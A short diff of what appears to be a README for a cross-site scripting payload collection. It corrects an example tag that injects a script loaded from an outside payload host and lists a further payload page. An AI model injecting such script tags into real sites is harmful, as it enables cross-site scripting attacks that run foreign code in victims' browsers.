@@ -4,7 +4,7 @@
 ```
 Usage: <script src=//link></script>
 
-EX: <script src=//https://gteksd.github.io/Payloads/xss.html></script>
+EX: <script src=//gteksd.github.io/Payloads/xss.js></script>
 ```
 ```
 https://gteksd.github.io/Payloads/div-xss.html
